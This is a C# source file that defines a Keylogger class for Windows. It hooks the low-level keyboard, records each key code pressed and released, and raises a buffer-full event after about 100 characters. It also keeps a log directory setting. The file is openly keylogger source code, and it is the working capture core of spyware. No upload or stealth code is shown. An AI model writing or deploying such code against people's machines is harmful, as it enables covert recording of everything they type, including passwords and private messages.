using Rodjenihm.Zlogger.WinAPI;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Rodjenihm.Zlogger.Core
{
    public class Keylogger : IDisposable
    {
        private readonly LowLevelKeyboardHook hook;
        private readonly HOOKPROC keyboardHookProc = null;
        public string LogDir { get; set; } = string.Empty;
        public StringBuilder Buffer { get; } = new StringBuilder();

        public Keylogger()
        {
            hook = new LowLevelKeyboardHook();
            keyboardHookProc = (nCode, wParam, lParam) =>
            {
                if (nCode >= 0)
                {
                    var vkCode = Marshal.ReadInt32(lParam);
                    var keyEventArgs = new KeyEventArgs { VkCode = vkCode };

                    if (wParam == (IntPtr)WindowsMessages.WM_KEYDOWN) OnKeyDown(this, keyEventArgs);
                    if (wParam == (IntPtr)WindowsMessages.WM_KEYUP) OnKeyUp(this, keyEventArgs);

                    if (Buffer.Length > 100)
                    {
                        OnBufferFull(this);
                        Buffer.Clear();
                    }
                }

                return hook.NextHook(nCode, wParam, lParam);
            };
        }

        public Keylogger(string logDir) : this()
        {
            LogDir = logDir;
        }

        public void Run()
        {
            if (keyboardHookProc != null) hook.SetHook(keyboardHookProc);
            else throw new ArgumentNullException("Keyboard Hook Procedure is null", nameof(keyboardHookProc));
        }

        public void Dispose()
        {
            hook.RemoveHook();
        }

        public event Action<Keylogger, KeyEventArgs> KeyDown;
        public event Action<Keylogger, KeyEventArgs> KeyUp;
        public event Action<Keylogger> BufferFull;

        protected virtual void OnKeyDown(Keylogger sender, KeyEventArgs e)
        {
            KeyDown?.Invoke(sender, e);
        }

        protected virtual void OnKeyUp(Keylogger sender, KeyEventArgs e)
        {
            KeyUp?.Invoke(sender, e);
        }

        protected virtual void OnBufferFull(Keylogger keylogger)
        {
            BufferFull?.Invoke(keylogger);
        }
    }
}
